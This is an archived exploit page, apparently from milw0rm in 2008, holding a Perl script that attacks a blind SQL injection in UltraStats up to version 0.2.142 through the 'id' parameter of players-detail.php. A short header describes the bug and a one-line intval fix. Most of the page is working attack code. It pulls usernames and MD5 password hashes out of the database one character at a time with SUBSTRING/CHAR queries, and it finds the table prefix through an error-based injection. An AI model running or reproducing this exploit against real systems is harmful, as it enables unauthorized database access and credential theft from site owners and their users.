<html><head><title>Ultrastats <= 0.2.142 (players-detail.php) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

#
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.shooter-szene.de | http://www.ultrastats.org
# [!] Detected...: 29.06.2008
# [!] Reported...: 04.07.2008
# [!] Response...: xx.xx.2008
#
# [!] Background.: UltraStats is a very flexable log analyzing tool for Call of Duty 2 Server logfiles. 
#                  It is able to parse and consolidate the information it can gather from these logs, 
#                  and put them into a MySQL Database with a very efficient and high optimiced database 
#                  layout.
#
# [!] Bug........: $_GET['id'] in players-detail.php near line 52
#                  
#                  36: if ( isset($_GET['id']) )
#                  37: {
#                  38: 		// get and check
#                  39: 		$content['playerguid'] = DB_RemoveBadChars($_GET['id']);
#
#                  52:     		$sqlquery = &quot;SELECT &quot; .
#                  53:				&quot;sum( &quot; .STATS_ALIASES . &quot;.Count) as Count, &quot; .
#                  54:				STATS_ALIASES . &quot;.Alias as Aliases_Alias, &quot; .
#                  55:				STATS_ALIASES . &quot;.AliasAsHtml as Aliases_AliasAsHtml&quot; .
#                  56:				&quot; FROM &quot; . STATS_ALIASES .
#                  57:				&quot; WHERE PLAYERID = &quot; . $content['playerguid'] . &quot; &quot; .
#                  58:				GetCustomServerWhereQuery(STATS_ALIASES, false) .
#                  59:				&quot; GROUP BY &quot; . STATS_ALIASES . &quot;.Alias &quot; .
#                  60:				&quot; ORDER BY Count DESC&quot;;
#
# [!] Tested on..: v0.2.136, v0.2.142
#
# [!] Solution...: no update from vendor till now
#
# [!] Quick fix..: in players-detail.php line 39:
#
#                  - replace:
#                      $content['playerguid'] = DB_RemoveBadChars($_GET['id']);
#
#                  - with:
#                      $content['playerguid'] = intval(DB_RemoveBadChars($_GET['id']));
#

if(!$ARGV[1])
{
  print &quot;\n                                  \\#'#/                              &quot;;
  print &quot;\n                                  (-.-)                               &quot;;
  print &quot;\n   --------------------------oOO---(_)---OOo--------------------------&quot;;
  print &quot;\n   | Ultrastats &lt;= v0.2.142 (players-detail.php) Blind SQL Injection |&quot;;
  print &quot;\n   |                          coded by DNX                           |&quot;;
  print &quot;\n   ------------------------------------------------------------------&quot;;
  print &quot;\n[!] Usage: perl ultrastats.pl [Host] [Path] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example: perl ultrastats.pl 127.0.0.1 /ultrastats/ -o 2 -i 123 -l 2 -t users&quot;;
  print &quot;\n[!] Options:&quot;;
  print &quot;\n       -o [no]       1 = username (default)&quot;;
  print &quot;\n                     2 = password&quot;;
  print &quot;\n                     3 = find database prefix (error based)&quot;;
  print &quot;\n       -i [no]       Valid GUID, default is 1&quot;;
  print &quot;\n       -l [no]       Limitation in sql query, -l 0 shows the first row,&quot;;
  print &quot;\n                     -l 1 the second one and so on, default is 0&quot;;
  print &quot;\n       -t [name]     Changed the user table name, default is stats_users&quot;;
  print &quot;\n       -p [ip:port]  Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $target  = &quot;username&quot;;
my $user    = 1;
my $limit   = 0;
my $table   = &quot;stats_users&quot;;
my %options = ();
GetOptions(\%options, &quot;o=i&quot;, &quot;i=i&quot;, &quot;l=i&quot;, &quot;t=s&quot;, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

if($options{&quot;i&quot;})
{
  $user = $options{&quot;i&quot;};
}

if($options{&quot;l&quot;})
{
  $limit = $options{&quot;l&quot;};
}

if($options{&quot;t&quot;})
{
  $table = $options{&quot;t&quot;};
}

if($options{&quot;o&quot;} == 1)
{
  $target = &quot;username&quot;;
  get_username();
}
elsif($options{&quot;o&quot;} == 2)
{
  $target = &quot;password&quot;;
  get_password();
}
elsif($options{&quot;o&quot;} == 3)
{
  get_prefix();
}

sub get_username()
{
  syswrite(STDOUT, &quot;[!] Username: &quot;, 14);
  for(my $i = 1; $i &lt;= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found &amp;&amp; $h &lt;= 57)
    {
      if(istrue2($host, $path, $table, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
    if(!$found)
    {
      $h = 64;
      while(!$found &amp;&amp; $h &lt;= 122)
      {
        if(istrue2($host, $path, $table, $i, $h))
        {
          $found = 1;
          syswrite(STDOUT, chr($h), 1);
        }
        $h++;
      }
    }
  }  
}

sub get_password()
{
  syswrite(STDOUT, &quot;[!] MD5-Hash: &quot;, 14);
  for(my $i = 1; $i &lt;= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found &amp;&amp; $h &lt;= 57)
    {
      if(istrue2($host, $path, $table, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
    if(!$found)
    {
      $h = 97;
      while(!$found &amp;&amp; $h &lt;= 102)
      {
        if(istrue2($host, $path, $table, $i, $h))
        {
          $found = 1;
          syswrite(STDOUT, chr($h), 1);
        }
        $h++;
      }
    }
  }
}

sub get_prefix()
{
  my $ua = LWP::UserAgent-&gt;new;
  my $url = &quot;http://&quot;.$host.$path.&quot;players-detail.php?id=&quot;.$user.&quot;'&quot;;
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  my $response = $ua-&gt;get($url);
  my $content = $response-&gt;content;
  
  $content =~ /^Database error: Invalid SQL: SELECT sum\( (.*?)_aliases.Count\) as Count,/;
  print &quot;[!] Prefix: &quot;.$1;
}

print &quot;\n[!] Exploit done\n&quot;;

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $table = shift;
  my $i     = shift;
  my $h     = shift;
  
  my $ua = LWP::UserAgent-&gt;new;
  my $url = &quot;http://&quot;.$host.$path.&quot;players-detail.php?id=&quot;.$user.&quot;%20AND%20SUBSTRING((SELECT%20&quot;.$target.&quot;%20FROM%20&quot;.$table.&quot;%20LIMIT%20&quot;.$limit.&quot;,1),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)&quot;;
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  my $response = $ua-&gt;get($url);
  my $content = $response-&gt;content;
  
  my $regexp = &quot;Top Hitlocations where you got killed by others&quot;;
  my $regexp2 = &quot;Meist genutzte Aliases&quot;;
  
  if($content =~ /$regexp/ || $content =~ /$regexp2/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2008-07-13]</pre></html>